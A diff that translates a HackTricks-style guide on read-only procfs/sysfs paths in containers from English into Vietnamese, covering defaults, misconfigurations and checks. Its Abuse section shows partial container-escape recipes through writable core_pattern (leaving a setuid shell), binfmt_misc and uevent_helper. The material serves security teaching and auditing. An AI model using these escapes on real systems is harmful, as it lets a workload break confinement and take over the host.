@@ -1,31 +1,31 @@
-# Read-Only System Paths
+# Các đường dẫn hệ thống chỉ đọc
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Read-only system paths are a separate protection from masked paths. Instead of hiding a path completely, the runtime exposes it but mounts it read-only. This is common for selected procfs and sysfs locations where read access may be acceptable or operationally necessary, but writes would be too dangerous.
+Các đường dẫn hệ thống chỉ đọc là một lớp bảo vệ riêng biệt với các đường dẫn bị che. Thay vì ẩn hoàn toàn một đường dẫn, runtime vẫn hiển thị đường dẫn đó nhưng gắn kết nó ở chế độ chỉ đọc. Cách này thường được áp dụng cho một số vị trí procfs và sysfs, nơi quyền đọc có thể được chấp nhận hoặc cần thiết cho hoạt động, nhưng quyền ghi sẽ quá nguy hiểm.
 
-The purpose is straightforward: many kernel interfaces become much more dangerous when they are writable. A read-only mount does not remove all reconnaissance value, but it prevents a compromised workload from modifying the underlying kernel-facing files through that path.
+Mục đích rất đơn giản: nhiều giao diện kernel trở nên nguy hiểm hơn nhiều khi có thể ghi. Gắn kết chỉ đọc không loại bỏ mọi giá trị do thám, nhưng ngăn workload bị xâm phạm sửa đổi các tệp hướng đến kernel thông qua đường dẫn đó.
 
-## Operation
+## Hoạt động
 
-Runtimes frequently mark parts of the proc/sys view as read-only. Depending on the runtime and host, this may include paths such as:
+Runtime thường đánh dấu một số phần trong chế độ xem proc/sys là chỉ đọc. Tùy runtime và host, các đường dẫn này có thể bao gồm:
 
 - `/proc/sys`
 - `/proc/sysrq-trigger`
 - `/proc/irq`
 - `/proc/bus`
 
-The actual list varies, but the model is the same: allow visibility where needed, deny mutation by default.<sup>[[1]](#references)</sup>
+Danh sách thực tế có thể khác nhau, nhưng mô hình vẫn giống nhau: cho phép hiển thị khi cần, mặc định từ chối mọi thay đổi.<sup>[[1]](#references)</sup>
 
 ## Lab
 
-Inspect the Docker-declared read-only path list:
+Kiểm tra danh sách đường dẫn chỉ đọc do Docker khai báo:
 
 ```bash
 docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
 ```
 
-Inspect the mounted proc/sys view from inside the container:
+Kiểm tra proc/sys được mount từ bên trong container:
 
 ```bash
 mount | grep -E '/proc|/sys'
@@ -33,24 +33,24 @@ find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
 find /sys -maxdepth 3 -writable 2>/dev/null | head
 ```
 
-## Security Impact
+## Tác động bảo mật
 
-Read-only system paths narrow a large class of host-impacting abuse. Even when an attacker can inspect procfs or sysfs, being unable to write there removes many direct modification paths involving kernel tunables, crash handlers, module-loading helpers, or other control interfaces. The exposure is not gone, but the transition from information disclosure to host influence becomes harder.
+Các đường dẫn hệ thống chỉ đọc hạn chế một nhóm lớn hành vi lạm dụng có thể ảnh hưởng đến host. Ngay cả khi kẻ tấn công có thể kiểm tra procfs hoặc sysfs, việc không thể ghi vào đó sẽ loại bỏ nhiều cách sửa đổi trực tiếp liên quan đến các kernel tunable, crash handler, helper nạp module hoặc giao diện điều khiển khác. Mức độ phơi lộ không biến mất, nhưng việc chuyển từ tiết lộ thông tin sang tác động lên host trở nên khó khăn hơn.
 
-## Misconfigurations
+## Cấu hình sai
 
-The main mistakes are unmasking or remounting sensitive paths read-write, exposing host proc/sys content directly with writable bind mounts, or using privileged modes that effectively bypass the safer runtime defaults. In Kubernetes, `procMount: Unmasked` and privileged workloads often travel together with weaker proc protection.<sup>[[2]](#references)</sup> Another common operational mistake is assuming that because the runtime usually mounts these paths read-only, all workloads are still inheriting that default.
+Những sai lầm chính là bỏ che chắn hoặc remount các đường dẫn nhạy cảm ở chế độ read-write, trực tiếp để lộ nội dung proc/sys của host thông qua bind mount có quyền ghi, hoặc dùng các chế độ privileged về cơ bản vô hiệu hóa các mặc định an toàn hơn của runtime. Trong Kubernetes, `procMount: Unmasked` và workload privileged thường đi cùng với cơ chế bảo vệ proc yếu hơn.<sup>[[2]](#references)</sup> Một sai lầm vận hành phổ biến khác là cho rằng vì runtime thường mount các đường dẫn này ở chế độ chỉ đọc nên mọi workload vẫn kế thừa mặc định đó.
 
-## Abuse
+## Lạm dụng
 
-If the protection is weak, begin by looking for writable proc/sys entries:
+Nếu cơ chế bảo vệ yếu, hãy bắt đầu bằng cách tìm các mục proc/sys có quyền ghi:
 
 ```bash
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
 ```
 
-When writable entries are present, high-value follow-up paths include:
+Khi có các mục có thể ghi, những đường dẫn cần kiểm tra tiếp theo có giá trị cao bao gồm:
 
 ```bash
 cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
@@ -60,20 +60,20 @@ cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; usef
 cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
 ```
 
-What these commands can reveal:
+Những gì các lệnh này có thể tiết lộ:
 
-- Writable entries under `/proc/sys` often mean the container can modify host kernel behavior rather than merely inspect it.
-- `core_pattern` is especially important because a writable host-facing value can be turned into a host code-execution path by crashing a process after setting a pipe handler.
-- `modprobe` reveals the helper used by the kernel for module-loading related flows; it is a classic high-value target when writable.
-- `binfmt_misc` tells you whether custom interpreter registration is possible. If registration is writable, this can become an execution primitive instead of just an information leak.
-- `panic_on_oom` controls a host-wide kernel decision and can therefore turn resource exhaustion into host denial of service.
-- `uevent_helper` is one of the clearest examples of a writable sysfs helper path producing host-context execution.
+- Các mục có quyền ghi bên dưới `/proc/sys` thường cho thấy container có thể thay đổi hành vi của kernel trên host, chứ không chỉ kiểm tra nó.
+- `core_pattern` đặc biệt quan trọng vì một giá trị hướng tới host có quyền ghi có thể trở thành đường dẫn thực thi code trên host nếu làm tiến trình crash sau khi thiết lập pipe handler.
+- `modprobe` tiết lộ helper mà kernel dùng cho các luồng liên quan đến việc tải module; đây là mục tiêu có giá trị cao kinh điển khi có quyền ghi.
+- `binfmt_misc` cho biết có thể đăng ký interpreter tùy chỉnh hay không. Nếu có quyền ghi để đăng ký, nó có thể trở thành primitive thực thi thay vì chỉ gây ra information leak.
+- `panic_on_oom` kiểm soát quyết định ở cấp kernel trên toàn host, do đó có thể biến tình trạng cạn kiệt tài nguyên thành sự cố từ chối dịch vụ trên host.
+- `uevent_helper` là một trong những ví dụ rõ nhất về việc đường dẫn helper trong sysfs có quyền ghi dẫn đến thực thi trong ngữ cảnh host.
 
-Interesting findings include writable host-facing proc knobs or sysfs entries that should normally have been read-only. At that point, the workload has moved from a constrained container view toward meaningful kernel influence.
+Các phát hiện đáng chú ý bao gồm những proc knob hoặc mục sysfs hướng tới host có quyền ghi, vốn bình thường phải ở chế độ chỉ đọc. Khi đó, workload đã chuyển từ góc nhìn container bị giới hạn sang khả năng tác động đáng kể đến kernel.
 
-### Full Example: `core_pattern` Host Escape
+### Ví dụ đầy đủ: Thoát container sang host bằng `core_pattern`
 
-If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
+Nếu có thể ghi vào `/proc/sys/kernel/core_pattern` từ bên trong container và đường dẫn này trỏ đến góc nhìn kernel của host, có thể lợi dụng nó để thực thi payload sau khi xảy ra crash:
 
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] || exit 1
@@ -97,11 +97,11 @@ gcc /tmp/crash.c -o /tmp/crash
 ls -l /tmp/rootsh
 ```
 
-If the path really reaches the host kernel, the payload runs on the host and leaves a setuid shell behind.
+Nếu path thực sự chạm tới host kernel, payload sẽ chạy trên host và để lại một shell setuid.
 
-### Full Example: `binfmt_misc` Registration
+### Ví dụ đầy đủ: Đăng ký `binfmt_misc`
 
-If `/proc/sys/fs/binfmt_misc/register` is writable, a custom interpreter registration can produce code execution when the matching file is executed:
+Nếu có thể ghi vào `/proc/sys/fs/binfmt_misc/register`, việc đăng ký một interpreter tùy chỉnh có thể dẫn đến code execution khi thực thi file khớp:
 
 ```bash
 mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
@@ -117,11 +117,11 @@ chmod +x /tmp/test.ht
 cat /tmp/binfmt.out
 ```
 
-On a host-facing writable `binfmt_misc`, the result is code execution in the kernel-triggered interpreter path.
+Trên `binfmt_misc` có thể ghi và hướng ra host, kết quả là code execution trong đường dẫn interpreter do kernel kích hoạt.
 
-### Full Example: `uevent_helper`
+### Ví dụ đầy đủ: `uevent_helper`
 
-If `/sys/kernel/uevent_helper` is writable, the kernel may invoke a host-path helper when a matching event is triggered:
+Nếu có thể ghi vào `/sys/kernel/uevent_helper`, kernel có thể gọi một helper nằm trên host khi một sự kiện khớp được kích hoạt:
 
 ```bash
 cat <<'EOF' > /tmp/evil-helper
@@ -135,11 +135,11 @@ echo change > /sys/class/mem/null/uevent
 cat /tmp/uevent.out
 ```
 
-The reason this is so dangerous is that the helper path is resolved from the host filesystem perspective rather than from a safe container-only context.
+Lý do điều này nguy hiểm đến vậy là vì đường dẫn helper được phân giải theo góc nhìn của hệ thống tệp trên host, thay vì trong ngữ cảnh an toàn chỉ dành cho container.
 
 ## Checks
 
-These checks determine whether procfs/sysfs exposure is read-only where expected and whether the workload can still modify sensitive kernel interfaces.
+Các kiểm tra này xác định liệu procfs/sysfs có được hiển thị ở chế độ chỉ đọc như mong đợi hay không, đồng thời liệu workload vẫn có thể sửa đổi các giao diện kernel nhạy cảm hay không.
 
 ```bash
 docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
@@ -148,26 +148,25 @@ find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable pro
 find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
 ```
 
-What is interesting here:
+Điều đáng chú ý ở đây:
 
-- A normal hardened workload should expose very few writable proc/sys entries.
-- Writable `/proc/sys` paths are often more important than ordinary read access.
-- If the runtime says a path is read-only but it is writable in practice, review mount propagation, bind mounts, and privilege settings carefully.
+- Một workload được harden thông thường chỉ nên để lộ rất ít mục proc/sys có thể ghi.
+- Các đường dẫn `/proc/sys` có thể ghi thường quan trọng hơn quyền đọc thông thường.
+- Nếu runtime cho biết một đường dẫn là chỉ đọc nhưng thực tế lại có thể ghi, hãy kiểm tra kỹ mount propagation, bind mount và thiết lập quyền đặc biệt.
 
-## Runtime Defaults
+## Mặc định của runtime
 
-| Runtime / platform | Default state | Default behavior | Common manual weakening |
+| Runtime / platform | Trạng thái mặc định | Hành vi mặc định | Cách nới lỏng phổ biến bằng cấu hình thủ công |
 | --- | --- | --- | --- |
-| Docker Engine | Enabled by default | Docker defines a default read-only path list for sensitive proc entries | exposing host proc/sys mounts, `--privileged` |
-| Podman | Enabled by default | Podman applies default read-only paths unless explicitly relaxed | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
-| Kubernetes | Inherits runtime defaults | Uses the underlying runtime read-only path model unless weakened by Pod settings or host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
-| containerd / CRI-O under Kubernetes | Runtime default | Usually relies on OCI/runtime defaults | same as Kubernetes row; direct runtime config changes can weaken the behavior |
+| Docker Engine | Được bật theo mặc định | Docker xác định danh sách đường dẫn chỉ đọc mặc định cho các mục proc nhạy cảm | để lộ các mount proc/sys của host, `--privileged` |
+| Podman | Được bật theo mặc định | Podman áp dụng các đường dẫn chỉ đọc mặc định trừ khi được nới lỏng rõ ràng | `--security-opt unmask=ALL`, mount rộng từ host, `--privileged` |
+| Kubernetes | Kế thừa mặc định của runtime | Sử dụng mô hình đường dẫn chỉ đọc của runtime bên dưới, trừ khi bị nới lỏng qua thiết lập Pod hoặc mount từ host | `procMount: Unmasked`, workload có đặc quyền, mount proc/sys có thể ghi từ host |
+| containerd / CRI-O under Kubernetes | Mặc định của runtime | Thường dựa vào mặc định của OCI/runtime | giống hàng Kubernetes; các thay đổi cấu hình runtime trực tiếp có thể làm suy yếu hành vi này |
 
-The key point is that read-only system paths are usually present as a runtime default, but they are easy to undermine with privileged modes or host bind mounts.
+Điểm mấu chốt là các đường dẫn hệ thống chỉ đọc thường được runtime thiết lập mặc định, nhưng rất dễ bị vô hiệu hóa bằng chế độ có đặc quyền hoặc bind mount từ host.
 
 ## References
 
-- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
-- [2] [Kubernetes API Reference: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)
-
+- [1] [Đặc tả OCI Runtime: Cấu hình Linux Container (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
+- [2] [Tham chiếu API Kubernetes: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)
 {{#include ../../../../banners/hacktricks-training.md}}
